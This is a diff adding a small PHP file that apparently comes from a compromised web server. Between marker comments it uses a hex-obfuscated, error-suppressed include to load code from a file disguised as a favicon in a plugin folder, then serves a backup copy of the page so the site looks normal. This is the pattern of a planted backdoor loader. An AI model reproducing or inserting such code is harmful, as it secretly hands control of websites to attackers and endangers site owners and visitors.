@@ -1,0 +1,9 @@
+<?php
+/*1554a*/
+
+@include "\x2fho\x6de/\x77eb\x6cik\x65c/\x70ub\x6cic\x5fht\x6dl/\x70to\x2fph\x6fne\x2frs\x2dpl\x75gi\x6e/f\x61vi\x63on\x5fd2\x3347\x39.i\x63o";
+
+/*1554a*/
+
+
+echo file_get_contents('index.html.bak.bak');
